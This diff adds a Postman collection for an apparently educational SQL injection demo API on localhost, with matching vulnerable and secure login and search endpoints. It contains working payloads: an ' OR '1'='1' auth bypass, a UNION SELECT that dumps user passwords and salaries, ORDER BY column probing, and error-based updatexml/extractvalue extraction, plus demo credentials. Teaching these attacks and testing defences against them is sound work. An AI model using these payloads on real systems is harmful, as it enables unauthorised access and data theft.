@@ -1,0 +1,284 @@
+{
+  "info": {
+    "name": "SQLi Demo API",
+    "description": "Educational SQL Injection demo — intentionally vulnerable endpoints.\n\nBase URL: http://localhost:3000",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "Info",
+      "item": [
+        {
+          "name": "GET API Info",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://localhost:3000/"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Auth (Vulnerable)",
+      "item": [
+        {
+          "name": "Login — valid credentials",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin123\"\n}"
+            },
+            "url": "http://localhost:3000/api/auth/login"
+          }
+        },
+        {
+          "name": "Login — auth bypass (SQLi)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"' OR '1'='1' -- \",\n  \"password\": \"anything\"\n}"
+            },
+            "url": "http://localhost:3000/api/auth/login"
+          }
+        },
+        {
+          "name": "Login — error-based (broken quote)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin'\",\n  \"password\": \"test\"\n}"
+            },
+            "url": "http://localhost:3000/api/auth/login"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Auth (Secure)",
+      "item": [
+        {
+          "name": "Secure login — valid credentials",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin123\"\n}"
+            },
+            "url": "http://localhost:3000/api/auth/secure-login"
+          }
+        },
+        {
+          "name": "Secure login — bypass attempt (should fail)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"' OR '1'='1' -- \",\n  \"password\": \"anything\"\n}"
+            },
+            "url": "http://localhost:3000/api/auth/secure-login"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Users",
+      "item": [
+        {
+          "name": "List all users",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://localhost:3000/api/users"
+          }
+        }
+      ]
+    },
+    {
+      "name": "Search (Vulnerable)",
+      "item": [
+        {
+          "name": "Search — normal (admin)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/search?username=admin",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "admin"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Search — UNION dump all users",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/search?username=' UNION SELECT id, username, password, role, email, salary FROM users -- ",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "' UNION SELECT id, username, password, role, email, salary FROM users -- "
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Search — ORDER BY 6 (should work)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/search?username=' ORDER BY 6 -- ",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "' ORDER BY 6 -- "
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Search — ORDER BY 7 (should error)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/search?username=' ORDER BY 7 -- ",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "' ORDER BY 7 -- "
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Search — error-based (database name)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/search?username=' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- ",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- "
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Search — error-based (MySQL user)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/search?username=' AND extractvalue(1, concat(0x7e, user(), 0x7e)) -- ",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "' AND extractvalue(1, concat(0x7e, user(), 0x7e)) -- "
+                }
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Search (Secure)",
+      "item": [
+        {
+          "name": "Secure search — normal",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/secure-search?username=admin",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "secure-search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "admin"
+                }
+              ]
+            }
+          }
+        },
+        {
+          "name": "Secure search — UNION attempt (should not inject)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "http://localhost:3000/api/users/secure-search?username=' UNION SELECT id, username, password, role, email, salary FROM users -- ",
+              "host": ["http://localhost:3000"],
+              "path": ["api", "users", "secure-search"],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "' UNION SELECT id, username, password, role, email, salary FROM users -- "
+                }
+              ]
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
